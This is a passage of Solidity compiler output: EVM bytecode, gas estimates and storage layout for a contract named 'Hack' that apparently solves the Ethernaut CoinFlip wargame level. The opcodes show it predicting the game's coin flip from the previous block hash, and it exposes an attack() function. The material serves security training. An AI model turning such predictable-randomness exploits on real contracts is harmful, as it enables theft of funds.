PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x101 SWAP2 SWAP1 PUSH2 0x280 JUMP JUMPDEST POP JUMP JUMPDEST PUSH0 PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xE6F334D7 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x16F JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x193 SWAP2 SWAP1 PUSH2 0x2D5 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH0 PUSH1 0x1 NUMBER PUSH2 0x1A7 SWAP2 SWAP1 PUSH2 0x32D JUMP JUMPDEST BLOCKHASH PUSH0 SHR SWAP1 POP DUP1 PUSH1 0x2 SLOAD SUB PUSH2 0x1B9 JUMPI PUSH0 PUSH0 REVERT JUMPDEST DUP1 PUSH1 0x2 DUP2 SWAP1 SSTORE POP PUSH0 PUSH1 0x3 SLOAD DUP3 PUSH2 0x1CF SWAP2 SWAP1 PUSH2 0x38D JUMP JUMPDEST SWAP1 POP PUSH0 PUSH1 0x1 DUP3 EQ PUSH2 0x1E0 JUMPI PUSH0 PUSH2 0x1E3 JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP DUP1 SWAP4 POP POP POP POP SWAP1 JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x200 DUP2 PUSH2 0x1EE JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x219 PUSH0 DUP4 ADD DUP5 PUSH2 0x1F7 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x233 DUP2 PUSH2 0x21F JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x24C PUSH0 DUP4 ADD DUP5 PUSH2 0x22A JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x25F DUP2 PUSH2 0x21F JUMP JUMPDEST DUP2 EQ PUSH2 0x269 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x27A DUP2 PUSH2 0x256 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x295 JUMPI PUSH2 0x294 PUSH2 0x252 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x2A2 DUP5 DUP3 DUP6 ADD PUSH2 0x26C JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x2B4 DUP2 PUSH2 0x1EE JUMP JUMPDEST DUP2 EQ PUSH2 0x2BE JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x2CF DUP2 PUSH2 0x2AB JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x2EA JUMPI PUSH2 0x2E9 PUSH2 0x252 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x2F7 DUP5 DUP3 DUP6 ADD PUSH2 0x2C1 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0x337 DUP3 PUSH2 0x1EE JUMP JUMPDEST SWAP2 POP PUSH2 0x342 DUP4 PUSH2 0x1EE JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP DUP2 DUP2 GT ISZERO PUSH2 0x35A JUMPI PUSH2 0x359 PUSH2 0x300 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0x397 DUP3 PUSH2 0x1EE JUMP JUMPDEST SWAP2 POP PUSH2 0x3A2 DUP4 PUSH2 0x1EE JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x3B2 JUMPI PUSH2 0x3B1 PUSH2 0x360 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xDC DUP16 RETURN SWAP11 SGT PUSH15 0x2B96C747E0F0632CA52D7E95B18C21 SWAP16 BALANCE 0xDF DUP13 0xA5 0xAB 0xD9 MSIZE CALLDATASIZE SUB RETURNDATASIZE PUSH5 0x736F6C6343 STOP ADDMOD 0x1E STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "202200",
						"executionCost": "73014",
						"totalCost": "275214"
					},
					"external": {
						"attack()": "infinite",
						"consecutiveWins()": "infinite"
					},
					"internal": {
						"guess()": "infinite"
					}
				},
				"methodIdentifiers": {
					"attack()": "9e5faafc",
					"consecutiveWins()": "e6f334d7"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 84,
						"contract": "security/etheranut/CoinFlip/CoinFlip.sol:Hack",
						"label": "target",
						"offset": 0,
						"slot": "0",
						"type": "t_address"
					},
					{
						"astId": 90,
						"contract": "security/etheranut/CoinFlip/CoinFlip.sol:Hack",
						"label": "cf",
						"offset": 0,
						"slot": "1",
						"type": "t_contract(CoinFlip)81"
					},
					{
						"astId": 92,
						"contract": "security/etheranut/CoinFlip/CoinFlip.sol:Hack",
						"label": "lastHash",
						"offset": 0,
						"slot": "2",
						"type": "t_uint256"
					},
					{
						"astId": 95,
						"contract": "security/etheranut/CoinFlip/CoinFlip.sol:Hack",
						"label": "FACTOR",
						"offset": 0,
						"slot": "3",
						"type": "t_uint256"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					},
					"t_contract(CoinFlip)81": {
						"encoding": "inplace",
						"label": "contract CoinFlip",
						"numberOfBytes": "20"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}